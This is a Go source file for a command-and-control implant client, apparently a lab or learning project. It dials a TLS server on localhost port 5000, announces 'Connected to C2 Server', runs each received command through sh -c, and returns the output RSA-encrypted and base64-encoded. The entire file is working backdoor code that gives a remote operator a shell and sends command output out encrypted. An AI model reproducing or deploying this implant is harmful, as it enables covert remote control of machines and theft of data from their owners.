package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var publicKey *rsa.PublicKey

func main() {
	loadPublicKey()
	serverAddr := "127.0.0.1:5000"

	caCert, err := os.ReadFile("certs/server.crt")
	if err != nil {
		panic(err)
	}
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)

	config := &tls.Config{RootCAs: certPool}
	conn, err := tls.Dial("tcp", serverAddr, config)
	if err != nil {
		fmt.Println("[-] Failed to connect")
		return
	}
	defer conn.Close()

	fmt.Println("[+] Connected to C2 Server")
	reader := bufio.NewReader(conn)
	for {
		command, err := receiveCommand(reader)
		if err != nil {
			fmt.Println("[-] Connection closed")
			break
		}
		if command == "" {
			continue
		}
		output := executeCommand(command)
		encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, []byte(output), nil)
		if err != nil {
			fmt.Println("[-] Encryption failed")
			continue
		}
		b64 := base64.StdEncoding.EncodeToString(encrypted)
		conn.Write([]byte(b64 + "\n"))
	}
}

func loadPublicKey() {
	keyData, err := os.ReadFile("certs/rsa_public.pem")
	if err != nil {
		panic(err)
	}

	block, _ := pem.Decode(keyData)
	if block == nil {
		panic("[-] Failed to decode RSA public key")
	}

	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		panic(err)
	}
	publicKey = pub
}

func receiveCommand(r *bufio.Reader) (string, error) {
	line, err := r.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(line), nil
}

func executeCommand(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return "[-] Command execution failed"
	}
	return string(out)
}
